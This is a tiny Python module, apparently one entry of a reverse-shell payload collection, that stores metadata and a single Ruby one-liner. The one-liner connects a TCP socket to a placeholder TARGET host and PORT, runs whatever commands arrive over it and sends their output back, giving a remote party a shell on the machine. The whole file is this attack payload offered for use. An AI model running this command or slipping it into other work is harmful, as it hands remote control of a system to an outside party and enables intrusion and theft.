class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses ruby to establish a reverse shell."
    function    = "reverse shell"
    liner       = "ruby -rsocket -e 'c=TCPSocket.new(\"TARGET\",\"PORT\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
